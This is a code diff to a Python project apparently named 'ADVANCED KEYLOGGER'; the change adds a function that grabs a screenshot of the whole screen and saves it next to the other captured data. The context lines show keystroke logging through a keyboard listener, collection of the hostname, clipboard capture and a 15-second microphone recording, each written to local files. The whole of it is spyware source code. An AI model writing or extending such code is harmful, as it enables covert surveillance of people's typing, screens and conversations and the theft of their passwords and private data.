@@ -35,6 +35,7 @@ keys_info = "key_log.txt"
 system_info = "sys_info.txt"
 clipboard_info = "clipboard.txt"
 audio_info = "audio_recording.wav"
+screenshot_info = "screenshot.png"
 microphone_time = 15
 
 file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
@@ -73,7 +74,6 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-# Getting system information
 def get_system_info():
     with open(file_path + extend + "sys_info.txt", "a") as f:
         hostname = socket.gethostname()
@@ -120,3 +120,9 @@ def record_audio():
         print("Error recording audio:", str(e))
 
 record_audio()
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_info)
+
+screenshot()
